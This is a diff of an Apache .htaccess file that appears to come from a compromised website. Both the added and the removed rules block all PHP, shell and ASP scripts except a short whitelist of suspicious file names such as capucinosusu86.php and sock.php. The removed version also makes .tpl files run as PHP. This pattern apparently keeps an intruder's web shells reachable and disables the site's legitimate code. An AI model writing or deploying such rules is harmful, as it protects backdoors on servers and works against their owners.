@@ -1,39 +1,65 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(finale.php|alias.sample.php|exclusions.php|toxmlrpc.php|inc.php|composer.php|logo.php|capucinosusu86-MAR.php|capucinosusu86-MAR.shtml|capucinosusu86-MAR.php82|capucinosusu86.php|capucinosusu86.php82|5c00211.shtml|changes.php)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
 Options -Indexes
-
-<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
-Order allow,deny
-Deny from all
-</FilesMatch>
-<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
-Order allow,deny
-Allow from all
-</FilesMatch>
-
-<FilesMatch '^(Exception.php|IncludeFolder.php|locale.php|ThemeSettings.php|ChildDef.php|InvalidServiceInvokableException.php|PhpOption.php|InvalidStringException.php|smarty_internal_compile_private_network.php|phpmailer.lang-cz.php|SubmissionAdmins.inc.php|oaiMetadataSettings.php|Upgrades.inc.php|Scanner.inc.php|sock.php|AdminersCloud.php|IssueEntryHeader.inc.php|Dispatc.php|payments.php)$'>
-Order allow,deny
-Allow from all
-</FilesMatch>
-<FilesMatch "^\.">
-Order allow,deny
-Deny from all
-</FilesMatch>
-
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . index.php [L]
-</IfModule>
-
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . index.php [L]
-</IfModule>
-
-AddType application/x-httpd-php .tpl
